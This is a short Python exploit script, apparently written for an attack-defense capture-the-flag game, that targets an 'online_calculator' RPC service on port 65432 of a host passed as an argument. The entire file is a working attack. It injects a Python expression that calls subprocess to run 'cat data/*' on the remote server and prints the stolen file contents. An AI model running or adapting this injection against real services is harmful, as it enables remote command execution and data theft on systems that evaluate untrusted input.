#!/usr/bin/env python3
import sys
import httpx
from rpcpy.client import Client

host = sys.argv[1]

app = Client(httpx.Client(), base_url=f"http://{host}:65432/")

@app.remote_call
def online_calculator(expression):
    ...

print(online_calculator("""
__import__('subprocess').getoutput('cat data/*')
"""), flush=True)
